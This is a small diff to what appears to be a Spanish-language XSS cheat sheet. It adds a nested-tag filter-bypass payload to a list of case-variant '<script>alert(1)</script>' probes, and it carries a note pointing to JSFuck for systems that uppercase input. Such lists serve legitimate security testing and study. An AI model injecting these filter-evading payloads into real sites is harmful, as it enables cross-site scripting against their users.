@@ -2,6 +2,7 @@
 <script>alert(1)</script>
 <SCRIPT>alert(1)</SCRIPT>
 <sCrIpT>alert(1)</sCrIpT>
+<sc<script>ript>alert(1)</sc<script>ript>
 ```
 Si el sistema lo transforma todo el mayuscula usar [JSFUCK](https://jsfuck.com/)
 ```
